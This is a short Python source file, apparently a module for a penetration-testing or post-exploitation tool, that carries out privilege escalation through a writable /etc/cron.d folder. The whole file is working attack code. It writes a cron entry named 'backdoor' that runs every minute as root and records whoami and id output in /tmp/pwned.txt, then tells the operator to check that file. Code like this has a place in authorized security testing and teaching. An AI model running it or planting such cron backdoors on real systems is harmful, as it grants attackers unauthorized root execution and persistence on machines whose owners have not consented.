from .abc import Command
import subprocess

class CronPrivesc(Command):
    """Privilege escalation via writable cron.d folder"""

    def do_command(self, lines: str, *args):
        results = []

        cron_job = "* * * * * root sh -c 'whoami > /tmp/pwned.txt && id >> /tmp/pwned.txt'\n"

        try:
            with open("/etc/cron.d/backdoor", "w") as f:
                f.write(cron_job)
            results.append("[+] Cron job written to /etc/cron.d/backdoor")
            results.append("[*] Wait 60 seconds then check /tmp/pwned.txt")
        except Exception as e:
            results.append(f"[-] Failed: {e}")

        return "\n".join(results)